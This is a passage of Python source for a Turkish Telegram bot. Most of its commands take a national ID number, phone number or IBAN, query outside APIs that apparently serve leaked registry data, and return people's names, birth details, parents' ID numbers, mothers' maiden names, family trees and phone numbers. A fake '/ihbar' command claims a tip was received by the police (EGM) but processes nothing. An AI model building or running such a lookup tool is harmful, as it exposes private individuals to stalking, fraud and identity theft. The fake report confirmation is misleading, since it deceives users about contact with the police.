        bot.reply_to(message, '*⚠️ Lütfen geçerli bir GSM Numarası girin!.\nÖrnek:* `/operator 5553723339`', parse_mode="Markdown")
        return

    try:

        api_url = f"http://172.208.52.218/api/legaliapi/gsm.php?gsm={gsm_number}"
        response = requests.get(api_url)
        response.raise_for_status()

        
        data = response.json()
        if not data:
            bot.send_chat_action(message.chat.id, 'typing')
            time.sleep(0.1)
            bot.reply_to(message, '⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode="Markdown")
            return

        result_text = f"╭─━━━━━━━━━━━━─╮\n┃*GSM:* `{data['gsm']}`\n┃*Operatör:* `{data['operator']}`\n╰─━━━━━━━━━━━━─╯"
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, result_text, parse_mode="Markdown")
        increment_query_count()
    except requests.exceptions.HTTPError as errh:
        bot.reply_to(message, f'Hata! HTTP Error: {errh}')

    except requests.exceptions.ConnectionError as errc:
        bot.reply_to(message, f'Hata! Bağlantı Hatası: {errc}')

    except requests.exceptions.Timeout as errt:
        bot.reply_to(message, f'Hata! Zaman Aşımı Hatası: {errt}')

    except requests.exceptions.RequestException as err:
        bot.reply_to(message, f'Hata! Genel Hata: {err}')

    except Exception as e:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(2)
        bot.reply_to(message, f'⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode="Markdown")


@bot.message_handler(commands=['sulale'])
def get_sulale_info(message):
    try:
        # Kullanıcıdan TC kimlik numarasını al
        tc = message.text.split()[-1]
        
        # Sülale bilgilerini al
        sulale_data = find_sulale_info(tc)
        
        # Sülale bilgilerini işle
        formatted_info = process_sulale_data(sulale_data)
        
        # Kullanıcıya gönder
        bot.reply_to(message, formatted_info)

    except Exception as e:
        bot.reply_to(message, f'Bir hata oluştu: {str(e)}')

def find_sulale_info(tc):
    try:
        api_url = f'http://172.208.52.218/api/legaliapi/sulale.php?tc={tc}'
        response = requests.get(api_url)
        response.raise_for_status()

        data = response.json()
        return data

    except requests.exceptions.RequestException as err:
        return f'Hata! {err}'

    except Exception as e:
        return f'⚠️ Bir hata oluştu: {str(e)}'

def process_sulale_data(data):
    try:
        if data.get('success', False):
            sulale_info = data['aile']
            result_text = ""

            for category, category_info in sulale_info.items():
                result_text += f"{category.capitalize()} Bilgileri:\n"
                for person_info in category_info['data']:
                    result_text += format_person_info(person_info)
                result_text += "\n"

            return result_text
        else:
            return "oops apide bilgi bulunmadi."
    except Exception as e:
        return f'Hata! {e}'

def format_person_info(person_info):
    formatted_info = (
        f"T.C.: {person_info['TC']}\n"
        f"Adı: {person_info['ADI']}\n"
        f"Soyadı: {person_info['SOYADI']}\n"
        f"Doğum Tarihi: {person_info['DOGUMTARIHI']}\n"
        f"Nüfus İl: {person_info['NUFUSIL']}\n"
        f"Nüfus İlçe: {person_info['NUFUSILCE']}\n"
        f"Anne Adı: {person_info['ANNEADI']}\n"
        f"Anne T.C.: {person_info['ANNETC']}\n"
        f"Baba Adı: {person_info['BABAADI']}\n"
        f"Baba T.C.: {person_info['BABATC']}\n"
        f"Uyruk: {person_info['UYRUK']}\n"
        f"Yakınlık: {person_info['Yakınlık']}\n"
        f"GSM Numaraları: {', '.join(person_info.get('gsm', []))}\n"
    )
    return formatted_info

 
@bot.message_handler(commands=['burc'])
def burc(message):
    if message.chat.type != "private":
        return

    
    
    user_first_name = message.from_user.first_name

    
    tc = message.text.split()[1] if len(message.text.split()) > 1 else None

    if not tc:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(2)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/burc 11111111110`', parse_mode='Markdown')
        return

    try:
        api_url = f"https://sowixapi.online/api/sowixapi/burc.php?tc={tc}"
        response = requests.get(api_url)
        response.raise_for_status()

        
        data = response.json()
        if not data:
            bot.send_chat_action(message.chat.id, 'typing')
            time.sleep(0.1)
            bot.reply_to(message, '⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode='Markdown')
            return

        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        result_text = f"╭─━━━━━━━━━━━━─╮\n┃*T.C.*: `{data['tc']}`\n┃*Burç:* `{data['burc']}`\n╰─━━━━━━━━━━━━─╯"
        bot.reply_to(message, result_text, parse_mode='Markdown')
        increment_query_count()
    except requests.exceptions.HTTPError as errh:
        bot.reply_to(message, f'Hata! HTTP Error: {errh}')

    except requests.exceptions.ConnectionError as errc:
        bot.reply_to(message, f'Hata! Bağlantı Hatası: {errc}')

    except requests.exceptions.Timeout as errt:
        bot.reply_to(message, f'Hata! Zaman Aşımı Hatası: {errt}')

    except requests.exceptions.RequestException as err:
        bot.reply_to(message, f'Hata! Genel Hata: {err}')

    except Exception as e:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, f'⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode='Markdown')
        
@bot.message_handler(commands=['kizlik'])
def kizlik(message):
    if message.chat.type != "private":
        return

    user_id = message.from_user.id
   
    tc = message.text.split()[1] if len(message.text.split()) > 1 else None

    if not tc:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, '*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/kizlik 11111111110`', parse_mode='Markdown')
        return

    try:
        api_url = f"http://172.208.52.218/api/legaliapi/kizlik.php?tc={tc}"
        response = requests.get(api_url)
        response.raise_for_status()

        data = response.json()
        if not data:
            bot.send_chat_action(message.chat.id, 'typing')
            time.sleep(0.1)
            bot.reply_to(message, '⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode='Markdown')
            return

        # Verileri altyapıya ekleyin
        tc = data['tc']
        adi = data['adi']
        soyadi = data['soyadi']
        nufusIL = data['nufusIL']
        nufusILCE = data['nufusILCE']
        anneAdi = data['anneAdi']
        anneTC = data['anneTC']
        babaAdi = data['babaAdi']
        babaTC = data['babaTC']
        kizlikSoyadi = data['kizlikSoyadi']

        # Altyapınıza verileri ekleyin veya başka bir işlem yapın
        result_text = (
            f"╭─━━━━━━━━━━━━─╮\n"
            f"┃*T.C*.: `{tc}`\n"
            f"┃*Adı:* `{adi}`\n"
            f"┃*Soyadı:* `{soyadi}`\n"
            f"┃*Nüfus İL:* `{nufusIL}`\n"
            f"┃*Nüfus İLÇE:* `{nufusILCE}`\n"
            f"┃*Anne Adı:* `{anneAdi}`\n"
            f"┃*Anne T.C.:* `{anneTC}`\n"
            f"┃*Baba Adı:* `{babaAdi}`\n"
            f"┃*Baba T.C.:* `{babaTC}`\n"
            f"┃*Kızlık Soyadı:* `{kizlikSoyadi}`\n"
            f"╰─━━━━━━━━━━━━─╯"
        )

        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, result_text, parse_mode='Markdown')
        
    except requests.exceptions.HTTPError as errh:
        bot.reply_to(message, f'Hata! HTTP Error: {errh}')

    except requests.exceptions.ConnectionError as errc:
        bot.reply_to(message, f'Hata! Bağlantı Hatası: {errc}')

    except requests.exceptions.Timeout as errt:
        bot.reply_to(message, f'Hata! Zaman Aşımı Hatası: {errt}')

    except requests.exceptions.RequestException as err:
        bot.reply_to(message, f'Hata! Genel Hata: {err}')

    except Exception as e:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, f'⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode='Markdown')
        print(f"Hata! {e}")





@bot.message_handler(commands=['ailepro'])
def aile_sorgu(message):
    try:
        chat_id = message.chat.id
        tc_number = message.text.split()[1]

        url = f"https://sowixapi.online/api/sowixapi/aile.php?tc={tc_number}"
        response = requests.get(url)
        data = response.json()

        if "success" in data and data["success"]:
            family_info = ""
            for member_data in data["data"]:
                for key, value in member_data.items():
                    family_info += f"{key.capitalize()}: {value}\n"
                family_info += "\n"
            
            if len(family_info) <= 4096:
                bot.reply_to(message, family_info)
            else:
                half_length = len(family_info) // 2
                first_half = family_info[:half_length]
                second_half = family_info[half_length:]
                bot.reply_to(message, first_half)
                bot.reply_to(message, second_half)
        else:
            bot.reply_to(message, "Aile bilgisi bulunamadı.")
    except IndexError:
        bot.reply_to(message, "*⚠️ Lütfen geçerli bir T.C. Kimlik Numarası girin!.\nÖrnek:* `/ailepro 11111111110`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {e}")




     



 
        
@bot.message_handler(commands=['penis'])
def penis_size(message):
    if message.chat.type != "private":
        return
    try:
        query = message.text.strip().split(' ')
        if len(query) != 2 or len(query[1]) != 11:
        	bot.send_chat_action(message.chat.id, 'typing')
        	time.sleep(0.1)
        	bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/penis 11111111110`", parse_mode='Markdown')
        	return
        penis_length = random.choice([6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32])
        penis_unit = 'CM'
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, f"╭─━━━━━━━━━━━━━─╮\n┃*T.C* `{query[1]}`\n┃*Penis Boyutu:* `{penis_length}{penis_unit}`\n╰─━━━━━━━━━━━━━─╯", parse_mode='Markdown')
        increment_query_count()
    except IndexError:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir T.C Kimlik Numarası girin!\n\nÖrnek:* `/penis 11111111110`", parse_mode='Markdown')
 
@bot.message_handler(commands=['ayak'])
def tc(message):
  # Kullanıcı tarafından gönderilen mesajı al
  tc_no = message.text[4:]

  # TC kimlik numarası kontrol et
  if not tc_no:
    bot.reply_to(message, "**Lütfen TC kimlik numaranızı girin.**")
    return

  # Rastgele ayak numarası bilgisi oluştur
  ayak_no = random.randint(36, 47)
  ayak_tip = random.choice(["Sağ", "Sol"])

  # Bilgiyi gönder
  bot.reply_to(message, f"**TC kimlik numaranız: {tc_no}\nAyak Numaranız: {ayak_tip} {ayak_no}**")
 
@bot.message_handler(commands=['ihbar'])
def ihbar(message):
  # Kullanıcı tarafından gönderilen mesajı al
  ihbar_mesaji = message.text[6:]

  # Adresi kontrol et
  if not ihbar_mesaji:
    bot.reply_to(message, " *⚠️ Lütfen bir adres belirtin !\n\nÖrnek:* `/ihbar istanbul esenyurt `", parse_mode='Markdown')
    return

  if not is_valid_address(ihbar_mesaji):
    bot.reply_to(message," *⚠️ Lütfen bir adres belirtin !\n\nÖrnek:* `/ihbar istanbul esenyurt `", parse_mode='Markdown')

  # İhbar türünü seç
  ihbar_turu = select_ihbar_turu(message)
  if ihbar_turu is None:
    return

  # İletişim bilgilerini al
  iletisim_bilgileri = get_iletisim_bilgileri(message)
  if iletisim_bilgileri is None:
    return

  # Fotoğraf veya video al
  foto_video = get_foto_video(message)

  # İhbarı işle
  # (Burada ihbarı kaydetme veya ilgili birimlere iletme işlemleri yer alacaktır)

  bot.reply_to(message, f"İhbarınız basariyla alindi \n\n kaynak : EGM")

# Adres doğrulama fonksiyonu (örnek)
def is_valid_address(address):
  # Bu fonksiyonu adresin geçerliliğini kontrol etmek için kullanın
  # (Gerçek bir adres doğrulama API'si kullanabilirsiniz)
  return True

# İhbar türü seçme fonksiyonu (örnek)
def select_ihbar_turu(message):
  # Bu fonksiyonu kullanıcının ihbar türünü seçmesini sağlayın
  # (Klavye veya metin tabanlı seçim gibi yöntemler kullanabilirsiniz)
  return "Yangın"

# İletişim bilgilerini alma fonksiyonu (örnek)
def get_iletisim_bilgileri(message):
  # Bu fonksiyonu kullanıcının iletişim bilgilerini almasını sağlayın
  # (Telefon numarası, isim gibi bilgiler)
  return "555 123 4567"

# Fotoğraf veya video alma fonksiyonu (örnek)
def get_foto_video(message):
  # Bu fonksiyonu kullanıcının fotoğraf veya video eklemesine imkan verin
  # (Dosya alma veya URL ekleme gibi yöntemler kullanabilirsiniz)
  return None        
                      
@bot.message_handler(commands=['iban'])
def iban_sorgu(message):
    try:
        chat_id = message.chat.id
        iban = message.text.split()[1]

        url = f"https://sowixapi.online/api/sowixapi/iban.php?iban={iban}"
        response = requests.get(url)
        data = response.json()

        if "Kod" in data:
            iban_info = ""
            for key, value in data.items():
                iban_info += f"{key}: {value}\n"
            
            bot.reply_to(message, iban_info)
        else:
            bot.reply_to(message, "IBAN bilgisi bulunamadı.")
    except IndexError:
        bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir İban Numarası girin!\n\nÖrnek:* `/iban TR560001002247786851675002`", parse_mode='Markdown')

def ip_sorgula(ip_adresi):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_adresi}')
        data = response.json()
        country = data['country']
        city = data['city']
        region = data['regionName']
        isp = data['isp']
        latitude = data['lat']
        longitude = data['lon']
        timezone = data['timezone']
        zip_code = data['zip']
        return f"IP adresi: {ip_adresi}\nÜlke: {country}\nBölge: {region}\nŞehir: {city}\nZIP Kodu: {zip_code}\nISP: {isp}\nEnlem: {latitude}\nBoylam: {longitude}\nZaman Dilimi: {timezone}"
    except Exception as e:
        return f"ip Adresi Hatalı."

@bot.message_handler(commands=['ipadres'])
def handle_ipadres(message):
    try:
        ip_adresi = message.text.split()[1]
        ip_bilgi = ip_sorgula(ip_adresi)
        bot.reply_to(message, ip_bilgi)
    except Exception as e:
        bot.reply_to(message, f"bir ip Adresi Girmelisin.")


def gsm_sorgula(gsm_numarasi):
    try:
        url = f'http://172.208.52.218/api/legaliapi/gsmdetay.php?gsm={gsm_numarasi}'
        response = requests.get(url)
        data = response.json()
        
        if "success" in data and data["success"]:
            gsm_detay = data["Data"]
            gsm_mesaj = f"""
TC: {gsm_detay["TC"]}
Adı: {gsm_detay["ADI"]}
Soyadı: {gsm_detay["SOYADI"]}
Doğum Tarihi: {gsm_detay["DOGUMTARIHI"]}
Nüfus İl: {gsm_detay["NUFUSIL"]}
Nüfus İlçe: {gsm_detay["NUFUSILCE"]}
Anne Adı: {gsm_detay["ANNEADI"]}
Anne TC: {gsm_detay["ANNETC"]}
Baba Adı: {gsm_detay["BABAADI"]}
Baba TC: {gsm_detay["BABATC"]}
Uyruk: {gsm_detay["UYRUK"]}
"""
            return gsm_mesaj
        else:
            return "Bu GSM numarasına ait bilgi bulunamadı."
    except Exception as e:
        return f"GSM sorgulanırken bir hata oluştu."

@bot.message_handler(commands=['gsmtc'])
def handle_gsm(message):
    try:
        gsm_numarasi = message.text.split()[1]
        gsm_bilgi = gsm_sorgula(gsm_numarasi)
        bot.reply_to(message, gsm_bilgi)
    except Exception as e:
        bot.reply_to(message, f'*⚠️ Lütfen geçerli bir gsm giriniz.\nÖrnek:* `/gsmtc 5363292711`', parse_mode="Markdown")

@bot.message_handler(commands=['dolar'])
def doviz(message):
    try:
        response = requests.get("https://tilki.dev/api/dolar")
        if response.status_code == 200:
            wizardapi = response.json()
            dolar = wizardapi['dolar']
            bot.send_message(message.chat.id, f"*💸 DOVIZ : 1 DOLAR = {dolar} TL ✅*", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "*API'den veri çekilemedi!*", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"*Bir hata oluştu: {e}*", parse_mode="Markdown")


		
		


def main():
    bot.polling()

if __name__ == '__main__':
    while True:
        try:
            main()
        except Exception as e:
            print(e)
            time.sleep(1)